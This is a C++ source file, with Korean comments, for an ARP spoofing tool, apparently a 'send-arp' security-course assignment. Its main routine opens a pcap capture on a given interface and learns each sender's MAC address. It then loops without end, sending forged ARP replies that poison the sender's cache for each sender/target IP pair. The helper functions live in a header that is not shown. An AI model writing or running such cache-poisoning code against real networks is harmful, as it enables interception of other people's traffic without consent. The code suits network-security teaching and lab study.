#include "send-arp.h"

int main(int argc, char* argv[]) {
    // 1. 인자 개수 검사
	// 최소 4개여야 하고, 전체 개수는 짝수여야 함 (프로그램+인터페이스, 그리고 IP 쌍들)
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    // 2. pcap 핸들 열기
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    printf("Device %s opened successfully.\n", dev);

    // 3. 내 mac 주소와 ip 주소 얻어내기
    uint8_t my_mac[6];
    if (!getMyMac(dev, my_mac)) {
        fprintf(stderr, "Failed to get MAC address for %s\n", dev);
        return -1;
    }
    printf("\n");
    print_mac(my_mac);
    printf("\n");
    uint32_t my_ip = getMyIp(dev);
    print_ip(my_ip);
    printf("\n");

    // 3. 반복문으로 모든 IP 쌍에 대해 공격 수행
    while(true) {
        for (int i = 2; i < argc; i += 2) {
            const char* si = argv[i];
            const char* ti = argv[i+1];
            
            uint32_t sender_ip = setIp(si);
            uint32_t target_ip = setIp(ti);
            // 각 IP 쌍에 대해 ARP 공격 함수 호출
            // 1. sender IP의 MAC 주소를 얻기 위해 ARP Request를 보냄
            request_sender_mac(pcap, my_mac, my_ip, sender_ip);
            // 2. 응답으로 sender의 MAC 주소를 알아냄
            uint8_t sender_mac[6];
            if (!analysis_sender_mac(pcap, sender_ip, target_ip, sender_mac)) {
                printf("\n");
                printf("Failed to get sender's MAC address.\n");
                continue;
            }
            // 3. 위조된 ARP Reply (Infection) 패킷을 sender에게 전송
            printf("\n");
            printf("attack_mac: ");
            print_mac(sender_mac);
            printf("\n");
            send_arp_attack(pcap, sender_mac, sender_ip, target_ip, my_mac);
        }
    }
    
    printf("----------------------------------------\n");
    printf("All ARP attack packets have been sent.\n");

	pcap_close(pcap);
}
